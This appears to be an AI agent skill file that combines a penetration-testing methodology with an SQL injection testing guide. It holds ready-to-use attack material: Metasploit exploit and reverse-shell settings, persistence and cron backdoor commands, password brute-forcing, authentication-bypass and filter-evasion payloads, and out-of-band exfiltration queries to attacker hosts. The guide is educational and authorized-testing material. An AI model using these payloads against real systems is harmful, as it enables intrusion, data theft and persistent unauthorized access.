---
name: offensive-security
description: This skill should be used when the user asks to learn ethical hacking, understand penetration testing lifecycle, perform reconnaissance, conduct security scanning, exploit vulnerabilities, or write penetration test reports. It provides comprehensive ethical hacking methodology and techniques. This skill should be used when the user asks to test for SQL injection vulnerabilities, perform SQLi attacks, bypass authentication using SQL injection, extract database information through injection, detect SQL injection flaws, or exploit database query vulnerabilities. It provides comprehensive techniques for identifying, exploiting, and understanding SQL injection attack vectors across different database systems.
metadata:
  author: zebbern
  version: "1.1"
---


# Ethical Hacking Methodology

## Purpose

Master the complete penetration testing lifecycle from reconnaissance through reporting. This skill covers the five stages of ethical hacking methodology, essential tools, attack techniques, and professional reporting for authorized security assessments.

## Prerequisites

### Required Environment
- Kali Linux installed (persistent or live)
- Network access to authorized targets
- Written authorization from system owner

### Required Knowledge
- Basic networking concepts
- Linux command-line proficiency
- Understanding of web technologies
- Familiarity with security concepts

## Outputs and Deliverables

1. **Reconnaissance Report** - Target information gathered
2. **Vulnerability Assessment** - Identified weaknesses
3. **Exploitation Evidence** - Proof of concept attacks
4. **Final Report** - Executive and technical findings

## Core Workflow

### Phase 1: Understanding Hacker Types

Classification of security professionals:

**White Hat Hackers (Ethical Hackers)**
- Authorized security professionals
- Conduct penetration testing with permission
- Goal: Identify and fix vulnerabilities
- Also known as: penetration testers, security consultants

**Black Hat Hackers (Malicious)**
- Unauthorized system intrusions
- Motivated by profit, revenge, or notoriety
- Goal: Steal data, cause damage
- Also known as: crackers, criminal hackers

**Grey Hat Hackers (Hybrid)**
- May cross ethical boundaries
- Not malicious but may break rules
- Often disclose vulnerabilities publicly
- Mixed motivations

**Other Classifications**
- **Script Kiddies**: Use pre-made tools without understanding
- **Hacktivists**: Politically or socially motivated
- **Nation State**: Government-sponsored operatives
- **Coders**: Develop tools and exploits

### Phase 2: Reconnaissance

Gather information without direct system interaction:

**Passive Reconnaissance**
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
nslookup target.com
dig target.com ANY
dig target.com MX
dig target.com NS

# Subdomain discovery
dnsrecon -d target.com

# Email harvesting
theHarvester -d target.com -b all
```

**Google Hacking (OSINT)**
```
# Find exposed files
site:target.com filetype:pdf
site:target.com filetype:xls
site:target.com filetype:doc

# Find login pages
site:target.com inurl:login
site:target.com inurl:admin

# Find directory listings
site:target.com intitle:"index of"

# Find configuration files
site:target.com filetype:config
site:target.com filetype:env
```

**Google Hacking Database Categories:**
- Files containing passwords
- Sensitive directories
- Web server detection
- Vulnerable servers
- Error messages
- Login portals

**Social Media Reconnaissance**
- LinkedIn: Organizational charts, technologies used
- Twitter: Company announcements, employee info
- Facebook: Personal information, relationships
- Job postings: Technology stack revelations

### Phase 3: Scanning

Active enumeration of target systems:

**Host Discovery**
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
arp-scan -l

# Discover live hosts
nmap -sP 192.168.1.0/24
```

**Port Scanning**
```bash
# TCP SYN scan (stealth)
nmap -sS target.com

# Full TCP connect scan
nmap -sT target.com

# UDP scan
nmap -sU target.com

# All ports scan
nmap -p- target.com

# Top 1000 ports with service detection
nmap -sV target.com

# Aggressive scan (OS, version, scripts)
nmap -A target.com
```

**Service Enumeration**
```bash
# Specific service scripts
nmap --script=http-enum target.com
nmap --script=smb-enum-shares target.com
nmap --script=ftp-anon target.com

# Vulnerability scanning
nmap --script=vuln target.com
```

**Common Port Reference**
| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | File transfer |
| 22 | SSH | Secure shell |
| 23 | Telnet | Unencrypted remote |
| 25 | SMTP | Email |
| 53 | DNS | Name resolution |
| 80 | HTTP | Web |
| 443 | HTTPS | Secure web |
| 445 | SMB | Windows shares |
| 3306 | MySQL | Database |
| 3389 | RDP | Remote desktop |

### Phase 4: Vulnerability Analysis

Identify exploitable weaknesses:

**Automated Scanning**
```bash
# Nikto web scanner
nikto -h http://target.com

# OpenVAS (command line)
omp -u admin -w password --xml="<get_tasks/>"

# Nessus (via API)
nessuscli scan --target target.com
```

**Web Application Testing (OWASP)**
- SQL Injection
- Cross-Site Scripting (XSS)
- Broken Authentication
- Security Misconfiguration
- Sensitive Data Exposure
- XML External Entities (XXE)
- Broken Access Control
- Insecure Deserialization
- Using Components with Known Vulnerabilities
- Insufficient Logging & Monitoring

**Manual Techniques**
```bash
# Directory brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Web technology fingerprinting
whatweb target.com
```

### Phase 5: Exploitation

Actively exploit discovered vulnerabilities:

**Metasploit Framework**
```bash
# Start Metasploit
msfconsole

# Search for exploits
msf> search type:exploit name:smb

# Use specific exploit
msf> use exploit/windows/smb/ms17_010_eternalblue

# Set target
msf> set RHOSTS target.com

# Set payload
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST attacker.ip

# Execute
msf> exploit
```

**Password Attacks**
```bash
# Hydra brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ftp://target.com

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Web Exploitation**
```bash
# SQLMap for SQL injection
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# XSS testing
# Manual: <script>alert('XSS')</script>

# Command injection testing
# ; ls -la
# | cat /etc/passwd
```

### Phase 6: Maintaining Access

Establish persistent access:

**Backdoors**
```bash
# Meterpreter persistence
meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip

# SSH key persistence
# Add attacker's public key to ~/.ssh/authorized_keys

# Cron job persistence
echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
```

**Privilege Escalation**
```bash
# Linux enumeration
linpeas.sh
linux-exploit-suggester.sh

# Windows enumeration
winpeas.exe
windows-exploit-suggester.py

# Check SUID binaries (Linux)
find / -perm -4000 2>/dev/null

# Check sudo permissions
sudo -l
```

**Covering Tracks (Ethical Context)**
- Document all actions taken
- Maintain logs for reporting
- Avoid unnecessary system changes
- Clean up test files and backdoors

### Phase 7: Reporting

Document findings professionally:

**Report Structure**
1. **Executive Summary**
   - High-level findings
   - Business impact
   - Risk ratings
   - Remediation priorities

2. **Technical Findings**
   - Vulnerability details
   - Proof of concept
   - Screenshots/evidence
   - Affected systems

3. **Risk Ratings**
   - Critical: Immediate action required
   - High: Address within 24-48 hours
   - Medium: Address within 1 week
   - Low: Address within 1 month
   - Informational: Best practice recommendations

4. **Remediation Recommendations**
   - Specific fixes for each finding
   - Short-term mitigations
   - Long-term solutions
   - Resource requirements

5. **Appendices**
   - Detailed scan outputs
   - Tool configurations
   - Testing timeline
   - Scope and methodology

### Phase 8: Common Attack Types

**Phishing**
- Email-based credential theft
- Fake login pages
- Malicious attachments
- Social engineering component

**Malware Types**
- **Virus**: Self-replicating, needs host file
- **Worm**: Self-propagating across networks
- **Trojan**: Disguised as legitimate software
- **Ransomware**: Encrypts files for ransom
- **Rootkit**: Hidden system-level access
- **Spyware**: Monitors user activity

**Network Attacks**
- Man-in-the-Middle (MITM)
- ARP Spoofing
- DNS Poisoning
- DDoS (Distributed Denial of Service)

### Phase 9: Kali Linux Setup

Install penetration testing platform:

**Hard Disk Installation**
1. Download ISO from kali.org
2. Boot from installation media
3. Select "Graphical Install"
4. Configure language, location, keyboard
5. Set hostname and root password
6. Partition disk (Guided - use entire disk)
7. Install GRUB bootloader
8. Reboot and login

**Live USB (Persistent)**
```bash
# Create bootable USB
dd if=kali-linux.iso of=/dev/sdb bs=512k status=progress

# Create persistence partition
gparted /dev/sdb
# Add ext4 partition labeled "persistence"

# Configure persistence
mkdir /mnt/usb
mount /dev/sdb2 /mnt/usb
echo "/ union" > /mnt/usb/persistence.conf
umount /mnt/usb
```

### Phase 10: Ethical Guidelines

**Legal Requirements**
- Obtain written authorization
- Define scope clearly
- Document all testing activities
- Report all findings to client
- Maintain confidentiality

**Professional Conduct**
- Work ethically with integrity
- Respect privacy of data accessed
- Avoid unnecessary system damage
- Execute planned tests only
- Never use findings for personal gain

## Quick Reference

### Penetration Testing Lifecycle

| Stage | Purpose | Key Tools |
|-------|---------|-----------|
| Reconnaissance | Gather information | theHarvester, WHOIS, Google |
| Scanning | Enumerate targets | Nmap, Nikto, Gobuster |
| Exploitation | Gain access | Metasploit, SQLMap, Hydra |
| Maintaining Access | Persistence | Meterpreter, SSH keys |
| Reporting | Document findings | Report templates |

### Essential Commands

| Command | Purpose |
|---------|---------|
| `nmap -sV target` | Port and service scan |
| `nikto -h target` | Web vulnerability scan |
| `msfconsole` | Start Metasploit |
| `hydra -l user -P list ssh://target` | SSH brute force |
| `sqlmap -u "url?id=1" --dbs` | SQL injection |

## Constraints and Limitations

### Authorization Required
- Never test without written permission
- Stay within defined scope
- Report unauthorized access attempts

### Professional Standards
- Follow rules of engagement
- Maintain client confidentiality
- Document methodology used
- Provide actionable recommendations

## Troubleshooting

### Scans Blocked

**Solutions:**
1. Use slower scan rates
2. Try different scanning techniques
3. Use proxy or VPN
4. Fragment packets

### Exploits Failing

**Solutions:**
1. Verify target vulnerability exists
2. Check payload compatibility
3. Adjust exploit parameters
4. Try alternative exploits


---

<!-- merged-in: security/sql-injection-testing -->


# Merged section: sql-injection-testing (from security/sql-injection-testing)
Supporting files from this skill live in `references/sql-injection-testing/`, `scripts/sql-injection-testing/`, `data/sql-injection-testing/` (whichever exist).

# SQL Injection Testing

## Purpose

Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms. This skill enables systematic detection and exploitation of SQL injection vulnerabilities across in-band, blind, and out-of-band attack vectors to assess application security posture.

## Inputs / Prerequisites

### Required Access
- Target web application URL with injectable parameters
- Burp Suite or equivalent proxy tool for request manipulation
- SQLMap installation for automated exploitation
- Browser with developer tools enabled

### Technical Requirements
- Understanding of SQL query syntax (MySQL, MSSQL, PostgreSQL, Oracle)
- Knowledge of HTTP request/response cycle
- Familiarity with database schemas and structures
- Write permissions for testing reports

### Legal Prerequisites
- Written authorization for penetration testing
- Defined scope including target URLs and parameters
- Emergency contact procedures established
- Data handling agreements in place

## Outputs / Deliverables

### Primary Outputs
- SQL injection vulnerability report with severity ratings
- Extracted database schemas and table structures
- Authentication bypass proof-of-concept demonstrations
- Remediation recommendations with code examples

### Evidence Artifacts
- Screenshots of successful injections
- HTTP request/response logs
- Database dumps (sanitized)
- Payload documentation

## Core Workflow

### Phase 1: Detection and Reconnaissance

#### Identify Injectable Parameters
Locate user-controlled input fields that interact with database queries:

```
# Common injection points
- URL parameters: ?id=1, ?user=admin, ?category=books
- Form fields: username, password, search, comments
- Cookie values: session_id, user_preference
- HTTP headers: User-Agent, Referer, X-Forwarded-For
```

#### Test for Basic Vulnerability Indicators
Insert special characters to trigger error responses:

```sql
-- Single quote test
'

-- Double quote test
"

-- Comment sequences
--
#
/**/

-- Semicolon for query stacking
;

-- Parentheses
)
```

Monitor application responses for:
- Database error messages revealing query structure
- Unexpected application behavior changes
- HTTP 500 Internal Server errors
- Modified response content or length

#### Logic Testing Payloads
Verify boolean-based vulnerability presence:

```sql
-- True condition tests
page.asp?id=1 or 1=1
page.asp?id=1' or 1=1--
page.asp?id=1" or 1=1--

-- False condition tests  
page.asp?id=1 and 1=2
page.asp?id=1' and 1=2--
```

Compare responses between true and false conditions to confirm injection capability.

### Phase 2: Exploitation Techniques

#### UNION-Based Extraction
Combine attacker-controlled SELECT statements with original query:

```sql
-- Determine column count
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
-- Continue until error occurs

-- Find displayable columns
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--
UNION SELECT NULL,'a',NULL--

-- Extract data
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Error-Based Extraction
Force database errors that leak information:

```sql
-- MSSQL version extraction
1' AND 1=CONVERT(int,(SELECT @@version))--

-- MySQL extraction via XPATH
1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--

-- PostgreSQL cast errors
1' AND 1=CAST((SELECT version()) AS int)--
```

#### Blind Boolean-Based Extraction
Infer data through application behavior changes:

```sql
-- Character extraction
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--

-- Conditional responses
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

#### Time-Based Blind Extraction
Use database sleep functions for confirmation:

```sql
-- MySQL
1' AND IF(1=1,SLEEP(5),0)--
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- MSSQL
1'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
1'; SELECT pg_sleep(5)--
```

#### Out-of-Band (OOB) Extraction
Exfiltrate data through external channels:

```sql
-- MSSQL DNS exfiltration
1; EXEC master..xp_dirtree '\\attacker-server.com\share'--

-- MySQL DNS exfiltration
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--

-- Oracle HTTP request
1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```

### Phase 3: Authentication Bypass

#### Login Form Exploitation
Craft payloads to bypass credential verification:

```sql
-- Classic bypass
admin'--
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
') OR ('1'='1'--

-- Username enumeration
admin' AND '1'='1
admin' AND '1'='2
```

Query transformation example:
```sql
-- Original query
SELECT * FROM users WHERE username='input' AND password='input'

-- Injected (username: admin'--)
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Password check bypassed via comment
```

### Phase 4: Filter Bypass Techniques

#### Character Encoding Bypass
When special characters are blocked:

```sql
-- URL encoding
%27 (single quote)
%22 (double quote)
%23 (hash)

-- Double URL encoding
%2527 (single quote)

-- Unicode alternatives
U+0027 (apostrophe)
U+02B9 (modifier letter prime)

-- Hexadecimal strings (MySQL)
SELECT * FROM users WHERE name=0x61646D696E  -- 'admin' in hex
```

#### Whitespace Bypass
Substitute blocked spaces:

```sql
-- Comment substitution
SELECT/**/username/**/FROM/**/users
SEL/**/ECT/**/username/**/FR/**/OM/**/users

-- Alternative whitespace
SELECT%09username%09FROM%09users  -- Tab character
SELECT%0Ausername%0AFROM%0Ausers  -- Newline
```

#### Keyword Bypass
Evade blacklisted SQL keywords:

```sql
-- Case variation
SeLeCt, sElEcT, SELECT

-- Inline comments
SEL/*bypass*/ECT
UN/*bypass*/ION

-- Double writing (if filter removes once)
SELSELECTECT → SELECT
UNUNIONION → UNION

-- Null byte injection
%00SELECT
SEL%00ECT
```

## Quick Reference

### Detection Test Sequence
```
1. Insert ' → Check for error
2. Insert " → Check for error
3. Try: OR 1=1-- → Check for behavior change
4. Try: AND 1=2-- → Check for behavior change
5. Try: ' WAITFOR DELAY '0:0:5'-- → Check for delay
```

### Database Fingerprinting
```sql
-- MySQL
SELECT @@version
SELECT version()

-- MSSQL
SELECT @@version
SELECT @@servername

-- PostgreSQL
SELECT version()

-- Oracle
SELECT banner FROM v$version
SELECT * FROM v$version
```

### Information Schema Queries
```sql
-- MySQL/MSSQL table enumeration
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- Column enumeration
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle equivalent
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

### Common Payloads Quick List
| Purpose | Payload |
|---------|---------|
| Basic test | `'` or `"` |
| Boolean true | `OR 1=1--` |
| Boolean false | `AND 1=2--` |
| Comment (MySQL) | `#` or `-- ` |
| Comment (MSSQL) | `--` |
| UNION probe | `UNION SELECT NULL--` |
| Time delay | `AND SLEEP(5)--` |
| Auth bypass | `' OR '1'='1` |

## Constraints and Guardrails

### Operational Boundaries
- Never execute destructive queries (DROP, DELETE, TRUNCATE) without explicit authorization
- Limit data extraction to proof-of-concept quantities
- Avoid denial-of-service through resource-intensive queries
- Stop immediately upon detecting production database with real user data

### Technical Limitations
- WAF/IPS may block common payloads requiring evasion techniques
- Parameterized queries prevent standard injection
- Some blind injection requires extensive requests (rate limiting concerns)
- Second-order injection requires understanding of data flow

### Legal and Ethical Requirements
- Written scope agreement must exist before testing
- Document all extracted data and handle per data protection requirements
- Report critical vulnerabilities immediately through agreed channels
- Never access data beyond scope requirements

## Examples

### Example 1: E-commerce Product Page SQLi

**Scenario**: Testing product display page with ID parameter

**Initial Request**:
```
GET /product.php?id=5 HTTP/1.1
```

**Detection Test**:
```
GET /product.php?id=5' HTTP/1.1
Response: MySQL error - syntax error near ''' 
```

**Column Enumeration**:
```
GET /product.php?id=5 ORDER BY 4-- HTTP/1.1
Response: Normal
GET /product.php?id=5 ORDER BY 5-- HTTP/1.1
Response: Error (4 columns confirmed)
```

**Data Extraction**:
```
GET /product.php?id=-5 UNION SELECT 1,username,password,4 FROM admin_users-- HTTP/1.1
Response: Displays admin credentials
```

### Example 2: Blind Time-Based Extraction

**Scenario**: No visible output, testing for blind injection

**Confirm Vulnerability**:
```sql
id=5' AND SLEEP(5)-- 
-- Response delayed by 5 seconds (vulnerable confirmed)
```

**Extract Database Name Length**:
```sql
id=5' AND IF(LENGTH(database())=8,SLEEP(5),0)--
-- Delay confirms database name is 8 characters
```

**Extract Characters**:
```sql
id=5' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
-- Iterate through characters to extract: 'appstore'
```

### Example 3: Login Bypass

**Target**: Admin login form

**Standard Login Query**:
```sql
SELECT * FROM users WHERE username='[input]' AND password='[input]'
```

**Injection Payload**:
```
Username: administrator'--
Password: anything
```

**Resulting Query**:
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='anything'
```

**Result**: Password check bypassed, authenticated as administrator.

## Troubleshooting

### No Error Messages Displayed
- Application uses generic error handling
- Switch to blind injection techniques (boolean or time-based)
- Monitor response length differences instead of content

### UNION Injection Fails
- Column count may be incorrect → Test with ORDER BY
- Data types may mismatch → Use NULL for all columns first
- Results may not display → Find injectable column positions

### WAF Blocking Requests
- Use encoding techniques (URL, hex, unicode)
- Insert inline comments within keywords
- Try alternative syntax for same operations
- Fragment payload across multiple parameters

### Payload Not Executing
- Verify correct comment syntax for database type
- Check if application uses parameterized queries
- Confirm input reaches SQL query (not filtered client-side)
- Test different injection points (headers, cookies)

### Time-Based Injection Inconsistent
- Network latency may cause false positives
- Use longer delays (10+ seconds) for clarity
- Run multiple tests to confirm pattern
- Consider server-side caching effects
